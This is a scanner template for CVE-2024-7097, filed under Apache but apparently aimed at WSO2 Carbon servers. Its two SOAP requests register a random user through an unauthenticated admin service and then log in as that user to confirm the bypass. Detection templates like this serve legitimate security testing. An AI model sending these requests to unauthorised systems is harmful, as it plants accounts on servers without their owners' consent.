templates/apache/cve-2024-7097.yml

cve-id: CVE-2024-7097
severity: medium
type: auth-bypass
rules:
- method: POST
  path: /services/UserRegistrationAdminService.UserRegistrationAdminServiceHttpsSoap11Endpoint/
  expression: response.status == 202
  headers:
    SOAPAction: '"urn:addUser"'
    Content-Type: text/xml
  body: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\nxmlns:xsd=\"http://org.apache.axis2/xsd\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <xsd:addUser>\n<xsd:user>\n         <xsd:userName>{{randstr_1}}</xsd:userName>\n         <xsd:password>{{randstr_2}}</xsd:password>\n</xsd:user>\n      </xsd:addUser>\n   </soapenv:Body>\n</soapenv:Envelope>"
- method: POST
  path: /services/AuthenticationAdmin
  expression: response.body.bcontains(b"loginResponse") && response.body.bcontains(b"<ns:return>true</ns:return>")
  headers:
    SOAPAction: '""'
    Content-Type: text/xml
  body: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n                  xmlns:aut=\"http://authentication.services.core.carbon.wso2.org\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <aut:login>\n         <aut:username>{{randstr_1}}</aut:username>\n         <aut:password>{{randstr_2}}</aut:password>\n      </aut:login>\n   </soapenv:Body>\n</soapenv:Envelope>"
set:
  username: '{{randstr_1}}'
  password: '{{randstr_2}}'
